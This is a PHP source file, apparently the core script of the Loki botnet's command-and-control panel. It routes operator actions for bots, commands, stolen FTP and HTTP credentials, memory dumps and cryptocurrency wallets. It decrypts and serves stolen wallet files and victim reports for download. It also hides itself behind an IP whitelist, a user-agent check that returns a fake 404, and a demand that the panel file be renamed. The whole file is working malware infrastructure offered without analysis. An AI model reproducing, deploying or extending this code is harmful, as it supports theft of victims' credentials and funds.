<?php
	if(!defined('IN_LOKI'))
		define('IN_LOKI', 1);
		
	$Protocol    = "http://";
	if (isset($_SERVER['HTTPS']) && strtoupper($_SERVER['HTTPS']) == 'ON')
		$Protocol = "https://";
		
	$ScriptName  = $_SERVER['SCRIPT_NAME'];
	$Server   	 = "";//$_SERVER['HTTP_HOST'];
	$UserAgent   = $_SERVER['HTTP_USER_AGENT'];
	$ScriptURL	 = /*$Protocol . $Server .*/  $ScriptName;
	$Config 	 = "config.inc.php";
	$Install 	 = "install.php";
	$IP__ 		 =  "127.0.0.1";
	$Country__	 =  "XX";
	$LokiDBCon	 = NULL;
	
	//http://php.net/manual/en/function.set-error-handler.php
	set_error_handler('ErrorHandler', E_ALL);
	function ErrorHandler( $errno, $errstr, $errfile, $errline, $errcontext)
	{
		$ErrorType = $errno;
		switch($errno)
		{
			case E_ERROR:               $ErrorType = "E_ERROR"; break;
			case E_WARNING:             $ErrorType = "E_WARNING"; break;
			case E_PARSE:               $ErrorType = "E_PARSE"; break;
			case E_NOTICE:              $ErrorType = "E_NOTICE"; break;
			case E_CORE_ERROR:          $ErrorType = "E_CORE_ERROR"; break;
			case E_CORE_WARNING:        $ErrorType = "E_CORE_WARNING"; break;
			case E_COMPILE_ERROR:       $ErrorType = "E_COMPILE_ERROR"; break;
			case E_COMPILE_WARNING:     $ErrorType = "E_COMPILE_WARNING"; break;
			case E_USER_ERROR:          $ErrorType = "E_USER_ERROR"; break;
			case E_USER_WARNING:        $ErrorType = "E_USER_WARNING"; break;
			case E_USER_NOTICE:         $ErrorType = "E_USER_NOTICE"; break;
			case E_STRICT:              $ErrorType = "E_STRICT"; break;
			case E_RECOVERABLE_ERROR:   $ErrorType = "E_RECOVERABLE_ERROR"; break;
			case E_DEPRECATED:          $ErrorType = "E_DEPRECATED"; break;
			case E_USER_DEPRECATED:     $ErrorType = "E_USER_DEPRECATED"; break;
		}

		$ErrorINfo_ = print_r($errstr, true) . " (".$ErrorType.")" . "   ". print_r($errfile, true) . " (".print_r($errline, true) . " line)";
		
		
		global $LokiDBCon;
		if($LokiDBCon != NULL)
			$LokiDBCon->InsertData($ErrorINfo_, "error", time(), -1, 0, 0, TRUE);
	}
	
	ob_start();

	if(!file_exists($Config))
	{
		require_once("inc/class/misc.class.php");
		require_once("inc/class/mysqli.class.php");
		if(file_exists($Install))
			require_once($Install);
		else
			echo 'Can\' install script, '.$Install.' not exists!';
		die();
	}
	else
	{
		if(file_exists($Install))
		{
			if(!unlink ($Install))
			{
				echo 'Please remove '.$Install.' file!';
				die();
			}
		}
	}
	
	require_once($Config);
	require_once(INCLUDE_."/".LANG_DB);
	require_once(INCLUDE_."/class/misc.class.php");
	
	if (isset($White_Lists) && is_array($White_Lists))
	{
		if ((count($White_Lists) && array_search(GetClientIP(), $White_Lists, true) === false) || (AUTH_AGENT && AGENT_ != $UserAgent))
			Exit404(E404_);
	}

	require_once(INCLUDE_."/class/mysqli.class.php");
	require_once(INCLUDE_."/class/worker.class.php");
	
	if(strstr(strtolower($ScriptName), "panel.php") || strstr(strtolower($ScriptName), "index.php") || strstr(strtolower($ScriptName), "admin.php") || strstr(strtolower($ScriptName), "login.php"))
		die("Please change admin panel file name!");
	
	ob_end_clean ();
	
	$Action = '';
	if(isset($_REQUEST[ACTVALUE_]))
	{
		$Action  = trim($_REQUEST[ACTVALUE_]);
		if (array_search($Action, array('error', 'bot', 'command', 'ftp', 'wallet', 'http', 'chart', 'exit', 'other', 'random', 'settings', 'report', 'download', 'dump')) === false)
			$Action = 'main';
	}

	$Option_  	 = isset($_REQUEST[OPTVALUE_]) ? trim($_REQUEST[OPTVALUE_]) : '';
	$AuthCookie  = isset($_COOKIE[COOKIE_]) 	? trim($_COOKIE[COOKIE_]) : '';
	$AuthUrl  	 = isset($_REQUEST[AUTHVALUE_]) ? trim($_REQUEST[AUTHVALUE_]) : '';
	
	$AuthSuccess = FALSE;
	$AuthAttemp  = isset($_REQUEST['iU']) && isset($_REQUEST['iP']);
	$AuthUser 	 = $AuthPass = '';
	
	require_once(INCLUDE_."/class/wallet.class.php");

	$LokiDBCon = new LokiDB($DBData['hostname'], $DBData['username'], $DBData['password'], $DBData['database'], $DBData['port'],  $DBData['prefix'], FALSE, TRUE, 3);

	require_once(INCLUDE_."/class/login.class.php");

	$SettingsLang = $LokiDBCon->GetSettings("LangID");
	if($SettingsLang != NULL)
		$Lang = $SettingsLang;

	$SettingsPageLimit = $LokiDBCon->GetSettings("PageLimit");
	if($SettingsPageLimit != NULL)
		$PageLimit = intval($SettingsPageLimit);

	if(isset($_REQUEST['pI'])) $PageID = intval(trim($_REQUEST['pI']));
	if(isset($_REQUEST['pL'])) $PageLimit = intval(trim($_REQUEST['pL']));

	
	if(isset($_REQUEST['tD']))
	{
		$TotalPages_ = ceil(trim($_REQUEST['tD']) / $PageLimit);
		if($PageID - 1 > $TotalPages_)
			$PageID = 1;
	}
	
	
	$StartFrom = ($PageID - 1) * $PageLimit;

	$LINK_Download  = "?" . ACTVALUE_ . "=download&" . OPTVALUE_ . "=";
	$LINK_Report  	= "?" . ACTVALUE_ . "=report&"   . OPTVALUE_ . "=view&id=";
	$LINK_Delete  	= "?" . ACTVALUE_ . "=" . $Action . "&" . OPTVALUE_ . "=flush&id=";
	$LINK_Export  	= "?" . ACTVALUE_ . "=" . $Action . "&" . OPTVALUE_ . "=export";


	if($Action == 'chart')
	{
		require_once(INCLUDE_."/class/chart.class.php");
		die();
	}
	else if($Action == 'exit')
	{
		$LokiDBCon->RemoveAuthCookie();
		setcookie(COOKIE_, '', 1);
		header('Location: '. $ScriptURL);
		die();
	}
	else if($Action == 'download')
	{
		if($Option_ == 'datadl' && strlen($Option_) && isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
		{
			$Data = $LokiDBCon->ExportDatabyID(trim($_REQUEST['id']));
			if($Data)
			{
				$File___ = TEMP_ . '/' . $Data;
				if(file_exists($File___))
				{
					$Buffer = DecryptWallet(file_get_contents($File___), ENCKEY_);
					SetDownloadHeader(NowDate("Ymd_His") . "_" . $Data);
					echo $Buffer;
				}
			}
			die();
		}
		else if($Option_ == 'datar' && strlen($Option_) && isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
		{
			$Data = $LokiDBCon->ExportDatabyID(trim($_REQUEST['id']));
			if($Data)
			{
				$File___ = TEMP_ . '/' . $Data;
				if(file_exists($File___))
				{
					$Buffer = DecryptWallet(file_get_contents($File___), ENCKEY_);
					//SetDownloadHeader(NowDate("Ymd_His") . "_" . $Data);
					echo "<pre>";
					echo htmlentities($Buffer, ENT_QUOTES);
					echo "</pre>";
				}
			}
			die();
		}
		if($Option_ == 'wallet' && strlen($Option_) && isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
		{
			$Data = TEMP_ . '/' . trim($_REQUEST['id']);
			if(file_exists($Data))
			{
				$Buffer = DecryptWallet(file_get_contents($Data), ENCKEY_);
				SetDownloadHeader(NowDate("Ymd_His") . "_" . trim($_REQUEST['id']));
				echo $Buffer;
			}

			die();
		}
		
		if($Option_ == 'report' && strlen($Option_) && isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
		{
			$Mark_ = FALSE;
			if(isset($_REQUEST['m']))
				$Mark_ = trim($_REQUEST['m']);
			
			$Data = $LokiDBCon->ExportReport_(trim($_REQUEST['id']), $Mark_);
			if($Data != NULL)
			{
				SetDownloadHeader($Data['Name'] . '.zip');
				echo $Data['Data'];
			}
			
			die();
		}
		die();
	}

	include_once(INCLUDE_ . "/page/header.inc.php"); //OK

	if($Action == 'ftp' OR $Action == 'http' OR $Action == 'other')
		include_once(INCLUDE_ . "/page/data.inc.php");
	else if($Action == 'report')
		include_once(INCLUDE_ . "/page/report.inc.php");
	else if($Action == 'wallet')
		include_once(INCLUDE_ . "/page/wallet.inc.php");
	else if($Action == 'command')
		include_once(INCLUDE_ . "/page/command.inc.php");
	else if($Action == 'dump')
		include_once(INCLUDE_ . "/page/dump.inc.php");
	else if($Action == 'bot')
		include_once(INCLUDE_ . "/page/bot.inc.php");
	else if($Action == 'error')
		include_once(INCLUDE_ . "/page/error.inc.php");
	else if($Action == 'settings')
		include_once(INCLUDE_ . "/page/settings.inc.php");
	else
		include_once(INCLUDE_ . "/page/main.inc.php"); //OK

	die_();
